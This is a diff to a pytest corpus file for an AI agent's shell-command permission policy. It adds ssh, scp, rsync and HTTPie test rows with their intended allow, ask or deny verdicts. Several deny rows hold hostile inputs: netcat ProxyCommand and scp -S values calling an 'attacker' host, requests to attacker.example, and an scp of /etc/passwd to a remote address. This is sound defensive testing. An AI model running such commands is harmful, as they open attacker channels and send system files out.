@@ -97,22 +97,27 @@ from __future__ import annotations
 
 import argparse
 from collections.abc import Callable
+from contextlib import nullcontext
 import dataclasses
+import ipaddress
 import json
 import os
 from pathlib import Path
 import shlex
 import shutil
+import socket
 import subprocess
 import sys
 import tempfile
 from typing import Any
+from unittest import mock
 
 import pytest
 
 from chartreux.core.dangerous_commands import GitRepositoryRelocation, ModeledGitCall
 from chartreux.core.tools.base import BaseToolState
 from chartreux.core.tools.builtins import (
+    _remote_exec,
     _shell_argv,
     _shell_command_policy as policy,
     _shell_executor_grammar,
@@ -122,6 +127,7 @@ from chartreux.core.tools.builtins import (
     _shell_git_support,
 )
 from chartreux.core.tools.builtins.bash import Bash, BashArgs, BashToolConfig
+import chartreux.core.utils.shell as shell_module
 
 CORPUS_DIR = Path(__file__).resolve().parent / "shell_policy_corpus"
 CORPUS_PATH = CORPUS_DIR / "corpus.jsonl"
@@ -2111,7 +2117,16 @@ PERMISSION_ARGV: list[list[str]] = [
     ["sg", "docker", "-c"],
     ["sg", "docker", "-c-x"],
     # v0.5.9 P1-e2: probed egress clients and the watch repeater, denied
-    # fail-closed by the shipped denylist until each is modeled.
+    # fail-closed by the shipped denylist until each is modeled. The ssh row
+    # is CONVERTED in v0.7.1 S4b1b (never deleted): ssh left the denylist with
+    # its closed grammar, so this no-user row is denied BY GRAMMAR in the
+    # dangerous-command flow; the positive literal rows live in
+    # PERMISSION_S4B1B_CASES at the family's end, and the hostname-destination
+    # row there is CONVERTED again in S4b2a to an admitted-with-pinning ask.
+    # The scp/rsync rows are CONVERTED again in v0.7.1 S4b2c (never deleted):
+    # they left the denylist with the closed bounded transfer grammar, so
+    # these no-user remote rows are now denied BY GRAMMAR; the positive
+    # transfer rows live in PERMISSION_S4B2C_CASES at the family's end.
     ["ssh", "host", "git push"],
     ["watch", "-n", "1", "git", "push"],
     ["scp", "file", "host:backup"],
@@ -4605,8 +4620,13 @@ PERMISSION_S3_CASES: list[dict[str, Any]] = [
     {"argv": ["http"]},
     {"argv": ["http", "http://localhost:8080/", "stray-operand"]},
     {"argv": ["HTTPIE_CONFIG_DIR=cfg", "http", "http://localhost:8080/"]},
-    # The post-S3 egress-deny list, one row each: ssh/scp/rsync stay
-    # egress-denied so S4b's network.remote-exec path stays reachable.
+    # The post-S3 egress-deny list, one row each. The ssh row is CONVERTED in
+    # v0.7.1 S4b1b, never deleted: ssh left the denylist with its closed
+    # grammar, so this no-user row is denied BY GRAMMAR (it names no user).
+    # The scp/rsync rows are CONVERTED in v0.7.1 S4b2c, never deleted: they
+    # left the denylist with the closed bounded transfer grammar, so these
+    # no-user remote rows are denied BY GRAMMAR too; the positive transfer
+    # rows live in PERMISSION_S4B2C_CASES at the family's end.
     {"argv": ["ssh", "host", "git push"]},
     {"argv": ["scp", "file", "host:backup"]},
     {"argv": ["rsync", "-a", "src/", "host:dst/"]},
@@ -4640,21 +4660,296 @@ PERMISSION_S3_CASES: list[dict[str, Any]] = [
 ]
 
 
-# v0.7.0 HTTPS egress residual: HTTPie's `https` entry point is the same
-# request client with the https scheme defaulted. It has no documented,
-# corpus-tested grammar of its own — the `http` model admits only HTTPie's
-# request grammar — so under the same prerequisite rule that keeps wget2 and
-# httpie denied (no documented+corpus-testable grammar, so no modeling) it is
-# denied fail-closed. Grammar modeling is deferred to the v0.8.0 backlog.
-# The rows pin that the RETAINED denylist entry is what denies it: a plain
-# remote destination, a loopback destination (no auto-allow rides beside the
-# modeled `http`), an https-scheme destination, and a modeled wrapper that
-# re-analyzes the payload.
+# HTTPie's `https` entry point, v0.7.1 F2. The four shapes below were the
+# v0.7.0 residual rows, when the retained denylist entry denied every `https`
+# spelling; they are RE-DECIDED, never deleted (Amendment DD), because each
+# shape encodes a security expectation the modeled grammar has to answer for:
+#
+#  1. a remote destination behind an EXPLICIT `http://` scheme — HTTPie forces
+#     https:// only onto a SCHEMELESS operand, so this really is a plain-HTTP
+#     request and the grammar hard-denies it as cross-scheme;
+#  2. the same cross-scheme spelling on a LOOPBACK host — no loopback
+#     auto-allow rides beside it, because the scheme, not the host, is what
+#     the grammar cannot model;
+#  3. an explicit `https://` remote destination — a destination the model can
+#     name but cannot prove loopback, so it resolves ask-class as
+#     network.egress (the row that fails if the grammar is removed with the
+#     denylist entry);
+#  4. the cross-scheme spelling through the modeled `nice` wrapper, whose
+#     payload is re-analyzed and denied by the same grammar rule.
 PERMISSION_HTTPS_DENY_CASES: list[dict[str, Any]] = [
     {"argv": ["https", "http://attacker.example/"]},
     {"argv": ["https", "http://127.0.0.1:8080/"]},
     {"argv": ["https", "https://example.com/api"]},
     {"argv": ["nice", "https", "http://attacker.example/"]},
+]
+
+# v0.7.1 F1pkg1(b): the immutable executor option contract. Option-changing
+# shell invocations and option-changing builtins fail closed unconditionally;
+# nested shell re-entry fails closed only when its payload carries expansion
+# intent (glob metacharacters or extended-glob syntax without *?[); the
+# recursive-rm hard denial keeps its own reason ahead of the contract denial;
+# plain and rc-disabling invocations, positional-only `set`, and literal
+# extended-syntax words stay admitted.
+PERMISSION_F1B_CASES: list[dict[str, Any]] = [
+    # Shell invocations that change an option family or the startup behavior.
+    {"argv": [], "raw": "bash +O extglob -c 'echo hi'"},
+    {"argv": [], "raw": "bash -O extglob -c 'echo hi'"},
+    {"argv": [], "raw": "bash +o errexit -c 'echo hi'"},
+    {"argv": [], "raw": "env CI=1 bash +o errexit -c 'echo hi'"},
+    {"argv": [], "raw": "zsh -o extendedglob -c 'echo hi'"},
+    {"argv": [], "raw": "zsh +O extendedglob -c 'echo hi'"},
+    {"argv": [], "raw": "bash --posix -c 'echo hi'"},
+    {"argv": [], "raw": "bash --rcfile startup -c 'echo hi'"},
+    {"argv": [], "raw": "bash -ec 'echo hi'"},
+    # Option-changing builtins, top-level and nested.
+    {"argv": [], "raw": "setopt extendedglob; echo hi"},
+    {"argv": [], "raw": "setopt NO_NOMATCH; echo hi"},
+    {"argv": [], "raw": "shopt -s extglob; echo hi"},
+    {"argv": [], "raw": "set -o extglob; echo hi"},
+    {"argv": [], "raw": "set -e; echo hi"},
+    {"argv": [], "raw": "emulate -L zsh; echo hi"},
+    {"argv": [], "raw": "bash -c 'setopt extendedglob; echo hi'"},
+    {"argv": [], "raw": "env CI=1 setopt extendedglob; echo hi"},
+    # Nested shell re-entry with an expansion-bearing payload.
+    {"argv": [], "raw": "bash -c 'echo *.py'"},
+    {"argv": [], "raw": "bash -c 'echo ^foo'"},
+    {"argv": [], "raw": "bash -c 'ls foo#'"},
+    {"argv": [], "raw": "bash -c 'echo a~b'"},
+    {"argv": [], "raw": "bash -c \"bash -c 'echo *.py'\""},
+    {"argv": [], "raw": "env CI=1 bash -c 'echo *.py'"},
+    # The recursive-rm hard denial keeps its own reason (UU).
+    {"argv": [], "raw": "bash +O extglob -c 'uv run rm -r build'"},
+    # Extended syntax without *?[ at top level: admitted as literal words,
+    # except the paren form, which the parse layer denies as a syntax error.
+    {"argv": [], "raw": "echo ^foo"},
+    {"argv": [], "raw": "ls foo#"},
+    {"argv": [], "raw": "cat ^foo"},
+    {"argv": [], "raw": "echo @(foo)"},
+    {"argv": [], "raw": "echo +(foo)"},
+    # Admitted controls: plain/rc-disabling invocations and positional set.
+    {"argv": [], "raw": "bash -c 'echo hi'"},
+    {"argv": [], "raw": "sh -c 'echo hi'"},
+    {"argv": [], "raw": "zsh -c 'echo hi'"},
+    {"argv": [], "raw": "bash --noprofile -c 'echo hi'"},
+    {"argv": [], "raw": "bash --norc --noediting -c 'echo hi'"},
+    {"argv": [], "raw": "set -- x; echo hi"},
+]
+
+# v0.7.1 S4b1b + S4b2a: the closed ssh grammar. POSITIVE rows first — a
+# literal-IP destination, or since S4b2a a hostname the fixed resolver
+# answers uniquely non-locally, resolves ask-class as network.remote-exec
+# with the exact GRANTED destination (hostname, not resolved address) on
+# the proposal (the corpus harness carries no grant). The deny rows pin the
+# converted forms: local literal, hostile options, and the composed call
+# hard-deny with no proposal. Appended at the family's end so every earlier
+# entry keeps its recorded id.
+PERMISSION_S4B1B_CASES: list[dict[str, Any]] = [
+    # Positive literal-IP destinations: ask-class network.remote-exec.
+    {"argv": ["ssh", "deploy@8.8.8.8", "uptime"]},
+    {"argv": ["ssh", "-p", "2222", "deploy@8.8.8.8", "uptime"]},
+    {"argv": ["ssh", "deploy@[2606:4700:4700::1111]", "uptime"]},
+    {"argv": ["ssh", "-q", "deploy@1.1.1.1", "echo", "hi"]},
+    # S4b2a CONVERSION of the S4b1b hostname deny row (same position, same
+    # recorded id, never deleted): with the fixed resolver answering
+    # example.com uniquely non-locally, the hostname destination is now an
+    # admitted-with-pinning ask carrying deploy@example.com:22.
+    {"argv": ["ssh", "deploy@example.com", "uptime"]},
+    # Denied by grammar, never by a denylist pattern (no proposal exists).
+    {"argv": ["ssh", "deploy@127.0.0.1", "uptime"]},
+    {"argv": ["ssh", "deploy@0.0.0.0", "uptime"]},
+    {"argv": ["ssh", "-o", "ProxyCommand=nc attacker 4444", "deploy@8.8.8.8", "x"]},
+    {"argv": ["ssh", "-o", "UserKnownHostsFile=/tmp/evil", "deploy@8.8.8.8", "x"]},
+    {"argv": ["ssh", "-F", "/tmp/evilcfg", "deploy@8.8.8.8", "x"]},
+    {"argv": [], "raw": "ssh deploy@8.8.8.8 uptime && echo done"},
+    {"argv": [], "raw": "nice ssh deploy@8.8.8.8 uptime"},
+    # S4b2a hostname-resolution rows (appended; new recorded ids): the port
+    # form asks with the hostname destination key, and the non-admitting
+    # resolutions (ambiguous, local answer, resolution failure) hard-deny
+    # with no proposal.
+    {"argv": ["ssh", "-p", "2222", "deploy@example.com", "uptime"]},
+    {"argv": ["ssh", "deploy@ambiguous.example", "uptime"]},
+    {"argv": ["ssh", "deploy@local.example", "uptime"]},
+    {"argv": ["ssh", "deploy@unresolved.example", "uptime"]},
+]
+
+# v0.7.1 S4b2c: the closed bounded scp/rsync transfer grammar. POSITIVE rows
+# first — a bounded transfer to a literal-IP or uniquely-resolved hostname
+# destination resolves ask-class as network.remote-exec with the exact
+# destination on the proposal (the corpus harness carries no grant, so the
+# ask is recorded; the destination-keyed grant semantics are pinned in
+# tests/tools/test_bash_permissions.py TestS4b2cBoundedTransfers). The deny
+# rows pin the converted no-user rows and the other grammar denials: each
+# hard-denies with no proposal, so a grammar removal would reclassify the
+# positives to run-class and the denials to run-class too. Appended at the
+# family's end so every earlier entry keeps its recorded id.
+PERMISSION_S4B2C_CASES: list[dict[str, Any]] = [
+    # Bounded positives: ask-class network.remote-exec with the destination
+    # on the proposal (both transfer directions, port form, safe options).
+    {"argv": ["scp", "file", "deploy@8.8.8.8:backup"]},
+    {"argv": ["scp", "-P", "2222", "f", "deploy@8.8.8.8:x"]},
+    {"argv": ["scp", "-r", "dir", "deploy@8.8.8.8:bak/"]},
+    {"argv": ["scp", "deploy@8.8.8.8:bak", "local"]},
+    {"argv": ["scp", "f", "deploy@example.com:backup"]},
+    {"argv": ["rsync", "-a", "src/", "deploy@8.8.8.8:dst/"]},
+    {"argv": ["rsync", "-avz", "src/", "deploy@example.com:dst/"]},
+    # A local-only scp/rsync call is routine: the path layer governs the
+    # local copy (the denylist no longer shadows it).
+    {"argv": ["rsync", "-a", "src/", "dst/"]},
+    {"argv": ["scp", "a", "b"]},
+    # Denied by grammar, never by a denylist pattern (no proposal exists).
+    # The first two are the CONVERTED denylist rows (no user in the remote
+    # spec), also still present at their original recorded ids above.
+    {"argv": ["scp", "file", "host:backup"]},
+    {"argv": ["rsync", "-a", "src/", "host:dst/"]},
+    # Remote-to-remote, user-supplied transport, symlink-following, legacy
+    # protocol / server-chosen names, and the closed remote-path charset.
+    {"argv": ["scp", "-3", "a@8.8.8.8:x", "b@9.9.9.9:y"]},
+    {"argv": ["scp", "a@8.8.8.8:x", "b@9.9.9.9:y"]},
+    {"argv": ["rsync", "-e", "ssh", "a", "deploy@8.8.8.8:b"]},
+    {"argv": ["rsync", "--rsh", "ssh", "a", "deploy@8.8.8.8:b"]},
+    {"argv": ["rsync", "-L", "a", "deploy@8.8.8.8:b"]},
+    {"argv": ["scp", "-O", "f", "deploy@8.8.8.8:x"]},
+    {"argv": ["scp", "-T", "f", "deploy@8.8.8.8:x"]},
+    {"argv": ["scp", "-S", "nc attacker 4444", "f", "deploy@8.8.8.8:x"]},
+    {"argv": ["scp", "-i", "/tmp/id", "f", "deploy@8.8.8.8:x"]},
+    {"argv": ["scp", "-o", "ProxyCommand=nc attacker 4444", "f", "deploy@8.8.8.8:x"]},
+    {"argv": ["scp", "f", "deploy@8.8.8.8:*.py"]},
+    {"argv": ["scp", "f", "deploy@8.8.8.8:../x"]},
+    # Destination-side mutation / server-chosen temp names / daemon form.
+    {"argv": ["rsync", "--delete", "src/", "deploy@8.8.8.8:dst/"]},
+    {"argv": ["rsync", "-P", "src/", "deploy@8.8.8.8:dst/"]},
+    {"argv": ["rsync", "--rsync-path", "cmd", "a", "deploy@8.8.8.8:b"]},
+    {"argv": ["rsync", "src/", "deploy@8.8.8.8::daemonmod"]},
+    # Local or ambiguous destinations hard-deny with no proposal.
+    {"argv": ["scp", "deploy@127.0.0.1:x", "l"]},
+    {"argv": ["scp", "deploy@local.example:x", "l"]},
+    {"argv": ["scp", "deploy@ambiguous.example:x", "l"]},
+    {"argv": ["scp", "deploy@unresolved.example:x", "l"]},
+    # Composed and wrapped calls do not reach the transfer grammar.
+    {"argv": [], "raw": "scp f deploy@8.8.8.8:x && echo done"},
+    {"argv": [], "raw": "nice scp f deploy@8.8.8.8:x"},
+    # An outside-workspace LOCAL operand is gated by the path layer before
+    # any transfer authority (the denial names the path, not remote-exec).
+    {"argv": ["scp", "/etc/passwd", "deploy@8.8.8.8:bak"]},
+]
+
+
+# v0.7.1 F1pkg2: the bounded trailing-star admission. A final component whose
+# TRAILING star run is exactly two stars is admitted when the pinned executor
+# proves the run cannot recurse (bash pins globstar off; a POSIX shell has no
+# globstar), and it binds the same literal argv plan a single ``*`` binds.
+# Every row names the executor it was recorded under, so the verdicts do not
+# depend on the recording host's ``$SHELL``. The recursive ``**/`` form, a run
+# of three stars, a non-trailing run, and every zsh or unknown executor keep
+# the fail-closed denial, as do the retained no-match, directory, symlink and
+# non-standalone negatives.
+PERMISSION_F1PKG2_CASES: list[dict[str, Any]] = [
+    # Admitted spellings: the bare trailing ``**``, a prefixed one, and the
+    # single-component form inside a literal parent directory.
+    {"argv": [], "raw": "cat sub/**", "cwd": "glob-whitelist/ok", "shell": "bash"},
+    {"argv": [], "raw": "cat file.tx**", "cwd": "glob-whitelist/ok", "shell": "bash"},
+    {"argv": [], "raw": "cat **", "cwd": "glob-whitelist/dot", "shell": "bash"},
+    # The recursive form stays denied (``**/`` spans directory levels).
+    {"argv": [], "raw": "cat **/*.txt", "cwd": "glob-whitelist/ok", "shell": "bash"},
+    {
+        "argv": [],
+        "raw": "cat sub/**/gamma.txt",
+        "cwd": "glob-whitelist/ok",
+        "shell": "bash",
+    },
+    # A non-trailing consecutive-star run and a run of three stars stay denied.
+    {"argv": [], "raw": "cat *.t**", "cwd": "glob-whitelist/ok", "shell": "bash"},
+    {"argv": [], "raw": "cat ***", "cwd": "glob-whitelist/dot", "shell": "bash"},
+    # Executors whose contract does not prove a non-recursive run.
+    {"argv": [], "raw": "cat sub/**", "cwd": "glob-whitelist/ok", "shell": "zsh"},
+    {"argv": [], "raw": "cat sub/**", "cwd": "glob-whitelist/ok", "shell": "ksh93"},
+    # The retained negatives, re-proved on the admitted spelling.
+    {"argv": [], "raw": "cat **", "cwd": "glob-whitelist/ok", "shell": "bash"},
+    {"argv": [], "raw": "cat zz**", "cwd": "glob-whitelist/dot", "shell": "bash"},
+    {
+        "argv": [],
+        "raw": "cat linkdir/**",
+        "cwd": "glob-whitelist/shapes",
+        "shell": "bash",
+    },
+    {
+        "argv": [],
+        "raw": "cat sub/** | wc -l",
+        "cwd": "glob-whitelist/ok",
+        "shell": "bash",
+    },
+]
+
+
+# v0.7.1 F1pkg3: the quoted-word admission. A whole double-quoted `"$NAME"` /
+# `"${NAME}"` argument resolves to one literal word only in a provably
+# read-only position and only when a literal assignment to NAME precedes the
+# sole command unchanged; the resolved word binds to the actual spawn as a
+# literal argv element. Every other quoted spelling — ambient, empty, a
+# prefixed assignment value, a modifier, a concatenated or nested word — and
+# every invocation whose sole-command shape the literal transport cannot bind
+# (pipeline, command list, redirect) keeps the fail-closed expansion denial.
+PERMISSION_F1PKG3_CASES: list[dict[str, Any]] = [
+    # Admitted spellings, bare and braced, in the positional and option-value
+    # read-only positions of the whitelisted readers.
+    {"argv": [], "raw": 'X=alpha.txt; cat "$X"', "cwd": "glob-whitelist/ok"},
+    {"argv": [], "raw": 'X=alpha.txt; cat "${X}"', "cwd": "glob-whitelist/ok"},
+    {"argv": [], "raw": 'X=alpha.txt; cat "$X" "$X"', "cwd": "glob-whitelist/ok"},
+    {"argv": [], "raw": 'N=3; head -n "$N" alpha.txt', "cwd": "glob-whitelist/ok"},
+    {"argv": [], "raw": 'P=alpha; grep "$P" alpha.txt', "cwd": "glob-whitelist/ok"},
+    # Denied spellings: ambient, a second unbound name, an empty value, a
+    # prefixed assignment value, a modifier, and the concatenated/nested forms.
+    {"argv": [], "raw": 'cat "$X"', "cwd": "glob-whitelist/ok"},
+    {"argv": [], "raw": 'X=alpha.txt; cat "$Y"', "cwd": "glob-whitelist/ok"},
+    {"argv": [], "raw": 'X=; cat "$X"', "cwd": "glob-whitelist/ok"},
+    {"argv": [], "raw": 'X=y$Z; cat "$X"', "cwd": "glob-whitelist/ok"},
+    {
+        "argv": [],
+        "raw": 'X=alpha.txt; cat "${X:-fallback}"',
+        "cwd": "glob-whitelist/ok",
+    },
+    {"argv": [], "raw": 'X=alpha.txt; cat "pre$X"', "cwd": "glob-whitelist/ok"},
+    {"argv": [], "raw": 'X=alpha.txt; cat "$X$X"', "cwd": "glob-whitelist/ok"},
+    {
+        "argv": [],
+        "raw": 'X=alpha.txt; Y=beta.txt; cat "${X}${Y}"',
+        "cwd": "glob-whitelist/ok",
+    },
+    # The invocation stays a sole simple command: composition keeps the denial.
+    {"argv": [], "raw": 'X=alpha.txt; cat "$X" | wc -l', "cwd": "glob-whitelist/ok"},
+    {"argv": [], "raw": 'X=alpha.txt; cat "$X"; echo done', "cwd": "glob-whitelist/ok"},
+    {"argv": [], "raw": 'X=alpha.txt; cat "$X" > out.txt', "cwd": "glob-whitelist/ok"},
+]
+
+
+# v0.7.1 F2: HTTPie's `https` entry point under the `http` grammar with its
+# scheme rule. Appended at the family's end so every earlier entry keeps its
+# recorded id. The ADMITTED rows come first: a SCHEMELESS operand is forced to
+# https:// by HTTPie's program-name handling, so a loopback host there resolves
+# run-class — a spelling the `http` model must resolve ask instead. Then the
+# ask rows: a destination the model can name but cannot prove loopback, the
+# HTTPie localhost shorthand the recognizer cannot parse (no loopback
+# auto-allow rides on it), and — from the re-decided residual family — the
+# explicit-https remote destination. Then the unmodeled deny rows, which carry
+# no operation ID and no approval path: an option, the two local-file request
+# items, a non-https scheme (HTTPie never rewrites an explicit scheme), a
+# missing destination, a stray operand, and a startup-config indirection.
+PERMISSION_F2_CASES: list[dict[str, Any]] = [
+    {"argv": ["https", "https://127.0.0.1:8443/status"]},
+    {"argv": ["https", "localhost:8443/status"]},
+    {"argv": ["https", "POST", "https://[::1]:8443/api", "payload:=7"]},
+    {"argv": [], "raw": "https https://127.0.0.1:8443/search 'q==term'"},
+    {"argv": ["https", "example.com/api"]},
+    {"argv": ["https", "GET", "https://192.0.2.1/api"]},
+    {"argv": ["https", ":8443/status"]},
+    {"argv": ["https", "--json", "https://127.0.0.1:8443/"]},
+    {"argv": ["https", "POST", "https://127.0.0.1:8443/", "field@upload.txt"]},
+    {"argv": ["https", "PUT", "https://127.0.0.1:8443/", "payload:=@data.json"]},
+    {"argv": ["https", "GET", "ftp://127.0.0.1/pub/file"]},
+    {"argv": ["https"]},
+    {"argv": ["https", "https://127.0.0.1:8443/", "stray-operand"]},
+    {"argv": ["HTTPIE_CONFIG_DIR=cfg", "https", "https://127.0.0.1:8443/"]},
 ]
 
 
@@ -4711,8 +5006,37 @@ def _tokenize_paths(value: Any, root: Path) -> Any:
     return value
 
 
+# v0.7.1 S4b2a: the fixed hermetic hostname resolution the permission
+# family's ssh rows resolve through — the corpus records the
+# machine-independent resolve-validate verdict, never the recording host's
+# resolver. Hosts absent from the table fail resolution (the fail-closed
+# "failed" arm).
+FIXED_HOSTNAME_RESOLUTIONS: dict[str, tuple[str, ...]] = {
+    "example.com": ("93.184.216.34",),
+    "ambiguous.example": ("93.184.216.34", "1.1.1.1"),
+    "local.example": ("127.0.0.1",),
+}
+
+
+def fixed_hostname_resolver(host: str) -> frozenset:
+    """The fixed answer table for one hostname; unknown hosts raise."""
+    answers = FIXED_HOSTNAME_RESOLUTIONS.get(host.lower())
+    if answers is None:
+        raise socket.gaierror(-2, "Name or service not known")
+    return frozenset(ipaddress.ip_address(text) for text in answers)
+
+
 def observe_permission(entry: dict[str, Any], root: Path) -> dict[str, Any]:
-    """Resolved permission classes for the sg and shipped-denylist pins."""
+    """Resolved permission classes for the sg and shipped-denylist pins.
+
+    The S4b1b/S4b2a ssh rows classify locality through the fail-closed
+    classifier and resolve hostnames through the resolve-validate model, so
+    the local-interface enumeration AND the hostname resolver are pinned to
+    fixed sets here — the corpus records the machine-independent verdicts,
+    not the recording host's interfaces or resolver. A row may name the
+    executing shell (``"shell"``); the F1pkg2 trailing-star rows do, so their
+    executor-family verdicts do not depend on the recording host's ``$SHELL``.
+    """
     if entry.get("raw") is not None:
         command = str(entry["raw"])
     else:
@@ -4721,7 +5045,25 @@ def observe_permission(entry: dict[str, Any], root: Path) -> dict[str, Any]:
     # resolve in the fixture root itself.
     cwd = root / str(entry["cwd"]) if entry.get("cwd") else root
     tool = Bash(config_getter=lambda: BashToolConfig(), state=BaseToolState(), cwd=cwd)
-    context = tool.resolve_permission(BashArgs(command=command))
+    fixed_interfaces = frozenset({
+        ipaddress.ip_address("192.168.10.20"),
+        ipaddress.ip_address("fe80::1%eth0"),
+        ipaddress.ip_address("::1"),
+    })
+    shell = entry.get("shell")
+    pinned_shell = (
+        mock.patch.object(shell_module, "shell_executor", lambda: str(shell))
+        if shell is not None
+        else nullcontext()
+    )
+    with (
+        mock.patch.object(
+            _remote_exec, "_interface_addresses", lambda: fixed_interfaces
+        ),
+        mock.patch.object(_remote_exec, "_hostname_resolver", fixed_hostname_resolver),
+        pinned_shell,
+    ):
+        context = tool.resolve_permission(BashArgs(command=command))
     if context is None:
         return {"context": None}
     dumped = json.loads(context.model_dump_json())
@@ -4864,6 +5206,18 @@ def build_family_entries(family: str, root: Path) -> list[dict[str, Any]]:
             add(case, observe_permission(case, root))
         for case in PERMISSION_HTTPS_DENY_CASES:
             add(case, observe_permission(case, root))
+        for case in PERMISSION_F1B_CASES:
+            add(case, observe_permission(case, root))
+        for case in PERMISSION_S4B1B_CASES:
+            add(case, observe_permission(case, root))
+        for case in PERMISSION_S4B2C_CASES:
+            add(case, observe_permission(case, root))
+        for case in PERMISSION_F1PKG2_CASES:
+            add(case, observe_permission(case, root))
+        for case in PERMISSION_F1PKG3_CASES:
+            add(case, observe_permission(case, root))
+        for case in PERMISSION_F2_CASES:
+            add(case, observe_permission(case, root))
     else:
         raise AssertionError(f"unknown corpus family: {family}")
     return entries
@@ -4972,6 +5326,132 @@ def test_corpus_recorder_round_trip(family: str, fixtures_root: Path) -> None:
         f"corpus.jsonl is stale for family {family!r}; regenerate with: "
         "uv run python tests/tools/test_shell_policy_corpus.py --record"
     )
+
+
+# The F1pkg2 rows' INTENDED verdicts, written independently of the recorded
+# corpus values: the reviewed diff checks every recorded row against this
+# table, so a recorder run can never silently bless a widened admission.
+_F1PKG2_INTENDED_VERDICTS = {
+    ("cat sub/**", "bash", "glob-whitelist/ok"): "always",
+    ("cat file.tx**", "bash", "glob-whitelist/ok"): "always",
+    ("cat **", "bash", "glob-whitelist/dot"): "always",
+    ("cat **/*.txt", "bash", "glob-whitelist/ok"): "never",
+    ("cat sub/**/gamma.txt", "bash", "glob-whitelist/ok"): "never",
+    ("cat *.t**", "bash", "glob-whitelist/ok"): "never",
+    ("cat ***", "bash", "glob-whitelist/dot"): "never",
+    ("cat sub/**", "zsh", "glob-whitelist/ok"): "never",
+    ("cat sub/**", "ksh93", "glob-whitelist/ok"): "never",
+    ("cat **", "bash", "glob-whitelist/ok"): "never",
+    ("cat zz**", "bash", "glob-whitelist/dot"): "never",
+    ("cat linkdir/**", "bash", "glob-whitelist/shapes"): "never",
+    ("cat sub/** | wc -l", "bash", "glob-whitelist/ok"): "never",
+}
+
+
+def test_f1pkg2_trailing_star_rows_pin_the_intended_verdicts(
+    fixtures_root: Path,
+) -> None:
+    """Every F1pkg2 row resolves exactly as the reviewed intent says."""
+    assert len(_F1PKG2_INTENDED_VERDICTS) == len(PERMISSION_F1PKG2_CASES)
+    for case in PERMISSION_F1PKG2_CASES:
+        key = (case["raw"], case["shell"], case["cwd"])
+        assert key in _F1PKG2_INTENDED_VERDICTS, case
+        context = observe_permission(case, fixtures_root)["context"]
+        assert context["permission"] == _F1PKG2_INTENDED_VERDICTS[key], key
+
+
+# The F1pkg3 rows' INTENDED verdicts, written independently of the recorded
+# corpus values: the reviewed diff checks every recorded row against this
+# table, so a recorder run can never silently bless a widened admission.
+_F1PKG3_INTENDED_VERDICTS = {
+    ('X=alpha.txt; cat "$X"', "glob-whitelist/ok"): "always",
+    ('X=alpha.txt; cat "${X}"', "glob-whitelist/ok"): "always",
+    ('X=alpha.txt; cat "$X" "$X"', "glob-whitelist/ok"): "always",
+    ('N=3; head -n "$N" alpha.txt', "glob-whitelist/ok"): "always",
+    ('P=alpha; grep "$P" alpha.txt', "glob-whitelist/ok"): "always",
+    ('cat "$X"', "glob-whitelist/ok"): "never",
+    ('X=alpha.txt; cat "$Y"', "glob-whitelist/ok"): "never",
+    ('X=; cat "$X"', "glob-whitelist/ok"): "never",
+    ('X=y$Z; cat "$X"', "glob-whitelist/ok"): "never",
+    ('X=alpha.txt; cat "${X:-fallback}"', "glob-whitelist/ok"): "never",
+    ('X=alpha.txt; cat "pre$X"', "glob-whitelist/ok"): "never",
+    ('X=alpha.txt; cat "$X$X"', "glob-whitelist/ok"): "never",
+    ('X=alpha.txt; Y=beta.txt; cat "${X}${Y}"', "glob-whitelist/ok"): "never",
+    ('X=alpha.txt; cat "$X" | wc -l', "glob-whitelist/ok"): "never",
+    ('X=alpha.txt; cat "$X"; echo done', "glob-whitelist/ok"): "never",
+    ('X=alpha.txt; cat "$X" > out.txt', "glob-whitelist/ok"): "never",
+}
+
+
+def test_f1pkg3_quoted_word_rows_pin_the_intended_verdicts(fixtures_root: Path) -> None:
+    """Every F1pkg3 row resolves exactly as the reviewed intent says."""
+    assert len(_F1PKG3_INTENDED_VERDICTS) == len(PERMISSION_F1PKG3_CASES)
+    for case in PERMISSION_F1PKG3_CASES:
+        key = (case["raw"], case["cwd"])
+        assert key in _F1PKG3_INTENDED_VERDICTS, case
+        context = observe_permission(case, fixtures_root)["context"]
+        assert context["permission"] == _F1PKG3_INTENDED_VERDICTS[key], key
+
+
+# The F2 rows' INTENDED verdicts, written independently of the recorded corpus
+# values: the four re-decided `https` residual shapes and the added admitted/
+# ask/deny rows, keyed by the case's own identity. "admitted" is run-class,
+# "ask" is the network.egress proposal, and "deny" is the grammar's hard
+# denial (no operation ID, no proposal). The reviewed diff checks every
+# recorded row against this table, so a recorder run can never silently bless
+# a widened admission.
+_F2_INTENDED_VERDICTS: dict[tuple[str, object], str] = {
+    ("argv", ("https", "http://attacker.example/")): "deny",
+    ("argv", ("https", "http://127.0.0.1:8080/")): "deny",
+    ("argv", ("https", "https://example.com/api")): "ask",
+    ("argv", ("nice", "https", "http://attacker.example/")): "deny",
+    ("argv", ("https", "https://127.0.0.1:8443/status")): "admitted",
+    ("argv", ("https", "localhost:8443/status")): "admitted",
+    ("argv", ("https", "POST", "https://[::1]:8443/api", "payload:=7")): "admitted",
+    ("raw", "https https://127.0.0.1:8443/search 'q==term'"): "admitted",
+    ("argv", ("https", "example.com/api")): "ask",
+    ("argv", ("https", "GET", "https://192.0.2.1/api")): "ask",
+    ("argv", ("https", ":8443/status")): "ask",
+    ("argv", ("https", "--json", "https://127.0.0.1:8443/")): "deny",
+    ("argv", ("https", "POST", "https://127.0.0.1:8443/", "field@upload.txt")): "deny",
+    (
+        "argv",
+        ("https", "PUT", "https://127.0.0.1:8443/", "payload:=@data.json"),
+    ): "deny",
+    ("argv", ("https", "GET", "ftp://127.0.0.1/pub/file")): "deny",
+    ("argv", ("https",)): "deny",
+    ("argv", ("https", "https://127.0.0.1:8443/", "stray-operand")): "deny",
+    ("argv", ("HTTPIE_CONFIG_DIR=cfg", "https", "https://127.0.0.1:8443/")): "deny",
+}
+
+
+def test_f2_https_rows_pin_the_intended_verdicts(fixtures_root: Path) -> None:
+    """Every F2 row (added and re-decided) resolves as the reviewed intent says."""
+    cases = [*PERMISSION_F2_CASES, *PERMISSION_HTTPS_DENY_CASES]
+    assert len(_F2_INTENDED_VERDICTS) == len(cases)
+    for case in cases:
+        key = (
+            ("raw", case["raw"])
+            if case.get("raw") is not None
+            else ("argv", tuple(case["argv"]))
+        )
+        assert key in _F2_INTENDED_VERDICTS, case
+        context = observe_permission(case, fixtures_root)["context"]
+        assert context is not None, key
+        intended = _F2_INTENDED_VERDICTS[key]
+        if intended == "admitted":
+            assert context["permission"] == "always", key
+            continue
+        assert context["permission"] == "never", key
+        if intended == "ask":
+            assert context["denial_kind"] == "dangerous_command", key
+            proposal = context["proposal"]
+            assert proposal is not None, key
